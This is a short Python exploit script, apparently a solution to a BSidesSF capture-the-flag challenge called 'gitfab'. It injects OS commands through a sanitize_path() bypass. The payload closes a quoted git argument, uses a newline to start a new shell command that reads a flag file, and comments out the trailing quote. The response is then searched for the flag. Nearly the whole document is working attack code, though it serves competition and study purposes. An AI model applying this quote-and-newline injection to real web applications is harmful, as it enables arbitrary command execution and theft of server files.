#!/usr/bin/env python3
"""gitfab — OS Command Injection via " + \n bypass in sanitize_path()"""
import requests, sys, re

TARGET = sys.argv[1] if len(sys.argv) > 1 else "https://gitfab-3ea4455a.challenges.bsidessf.net"

# " closes git arg, \n starts new command, # comments trailing "
payload = '/history/x%22%0acat%20/home/ctf/flag.txt%0a%23'
r = requests.get(TARGET + payload, verify=False)

flag = re.search(r'CTF\{[^}]+\}', r.text)
if flag:
    print(flag.group())
else:
    print("Flag not found in response")
    print(r.text[:500])
